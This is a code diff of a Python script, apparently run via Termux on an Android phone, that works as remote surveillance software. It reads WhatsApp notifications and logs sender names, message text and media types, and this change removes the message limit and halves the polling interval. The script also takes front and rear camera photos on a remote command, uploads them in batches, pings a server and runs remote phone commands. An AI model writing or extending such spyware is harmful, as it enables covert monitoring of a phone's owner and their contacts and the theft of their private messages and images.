@@ -67,10 +67,10 @@ def obter_gps():
     gps_ok = False
 
 def obter_whatsapp():
-    """Ler notificações do WhatsApp"""
+    """Ler TODAS as notificacoes do WhatsApp com detalhes"""
     global ultimo_whatsapp
     agora = time.time()
-    if agora - ultimo_whatsapp < 30:
+    if agora - ultimo_whatsapp < 15:
         return []
     
     notif = run("termux-notification-list", timeout=5)
@@ -81,19 +81,47 @@ def obter_whatsapp():
             for n in dados:
                 pkg = n.get("packageName", "")
                 if "whatsapp" in pkg.lower():
+                    titulo = n.get("title", "")
+                    texto = n.get("content", "")
+                    
+                    # Detecta midia
+                    tem_midia = False
+                    tipo_midia = ""
+                    if "📷" in texto or "photo" in texto.lower() or "imagem" in texto.lower():
+                        tem_midia = True
+                        tipo_midia = "📷 Foto"
+                    elif "🎥" in texto or "video" in texto.lower() or "vídeo" in texto.lower():
+                        tem_midia = True
+                        tipo_midia = "🎥 Vídeo"
+                    elif "🎵" in texto or "audio" in texto.lower() or "áudio" in texto.lower():
+                        tem_midia = True
+                        tipo_midia = "🎵 Áudio"
+                    elif "📎" in texto or "documento" in texto.lower() or "arquivo" in texto.lower():
+                        tem_midia = True
+                        tipo_midia = "📎 Arquivo"
+                    elif "figurinha" in texto.lower() or "sticker" in texto.lower():
+                        tem_midia = True
+                        tipo_midia = "😄 Figurinha"
+                    
+                    # Se tem midia e texto vazio, coloca o tipo
+                    if tem_midia and not texto:
+                        texto = tipo_midia
+                    elif tem_midia:
+                        texto = f"{tipo_midia}: {texto}"
+                    
                     msgs.append({
-                        "titulo": n.get("title", "")[:50],
-                        "texto": n.get("content", "")[:100],
+                        "pessoa": titulo[:30] if titulo else "WhatsApp",
+                        "texto": texto[:150] if texto else "(sem texto)",
+                        "midia": tem_midia,
                         "hora": n.get("when", "")
                     })
             ultimo_whatsapp = agora
-            return msgs[:5]
+            return msgs  # Retorna TODAS, sem limite
         except:
             pass
     return []
 
 def executar_comando(acao):
-    """Executa comandos remotos"""
     print(f"   🔧 Executando: {acao}")
     if acao == "vibrar":
         run("termux-vibrate -d 1000", timeout=3)
@@ -103,10 +131,6 @@ def executar_comando(acao):
         run("termux-torch on", timeout=3)
         time.sleep(2)
         run("termux-torch off", timeout=3)
-    elif acao == "tela":
-        run("input keyevent 26", timeout=3)  # Power button
-    elif acao == "volume_max":
-        run("termux-volume music 15", timeout=3)
 
 def enviar_dados(payload):
     json_str = json.dumps(payload).replace("'", "'\\''")
@@ -144,12 +168,12 @@ def enviar_lote(front_b64, back_b64):
     except:
         return False
 
-print("🛰️  INICIADO (GPS + WhatsApp + Comandos)\n")
+print("🛰️  INICIADO (v2.1 - Fotos + WhatsApp completo)\n")
 
 while True:
     t0 = time.time()
     
-    # PING a cada 4 min
+    # PING
     agora = time.time()
     if agora - ultimo_ping > 240:
         run(f"curl -s -o /dev/null --connect-timeout 10 --max-time 15 {URL_PING}", timeout=12)
@@ -194,29 +218,34 @@ while True:
         
         # WhatsApp
         if msgs_whats:
-            print(f"   💬 {len(msgs_whats)} novas msgs WhatsApp")
+            print(f"   💬 {len(msgs_whats)} conversas no WhatsApp")
+            for m in msgs_whats[:3]:
+                print(f"      {m['pessoa']}: {m['texto'][:50]}")
         
         # Comandos Remotos
         if comando_remoto != "none":
             executar_comando(comando_remoto)
         
-        # Fotos
+        # FOTOS - CORRIGIDO
         if comando_cam == "take_dual":
-            print("📸 [DUAL] Tirando as duas fotos...")
+            print("📸 [DUAL] Tirando as duas fotos primeiro...")
             arq_tras = os.path.expanduser("~/nexos_back.jpg")
             arq_front = os.path.expanduser("~/nexos_front.jpg")
             
             b64_tras = capturar_foto(0, arq_tras)
-            print(f"   {'✅' if b64_tras else '❌'} Traseira")
+            print(f"   {'✅' if b64_tras else '❌'} Traseira capturada")
             time.sleep(0.3)
             b64_front = capturar_foto(1, arq_front)
-            print(f"   {'✅' if b64_front else '❌'} Frontal")
+            print(f"   {'✅' if b64_front else '❌'} Frontal capturada")
             
             if b64_tras or b64_front:
+                print("📤 Enviando lote...")
                 if enviar_lote(b64_front, b64_tras):
-                    print("   ✅ LOTE ENVIADO!")
+                    print("   ✅ LOTE ENVIADO COM SUCESSO!")
                 else:
-                    print("   ❌ Falha")
+                    print("   ❌ Falha no envio do lote")
+            else:
+                print("   ❌ Nenhuma foto capturada")
             
             for a in [arq_tras, arq_front]:
                 if os.path.exists(a): os.remove(a)
